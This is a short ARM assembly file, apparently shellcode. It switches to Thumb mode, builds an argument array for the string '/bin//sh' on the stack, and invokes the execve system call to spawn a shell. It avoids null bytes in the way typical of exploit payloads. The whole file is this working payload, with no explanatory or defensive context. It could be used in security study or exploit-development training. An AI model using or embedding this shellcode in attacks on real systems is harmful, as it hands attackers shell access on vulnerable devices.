        .globl _start
_start:
        add r7, pc, #1
        bx r7
        .thumb
        adr r7, binsh
        ldm r7!, {r0, r1}
        eor r2, r2
        push {r0, r1, r2}
        mov r0, sp
        push {r0, r2}
        mov r1, sp
        mov r7, #11
        svc 1
        .balign 4
binsh:
        .ascii "/bin//sh"
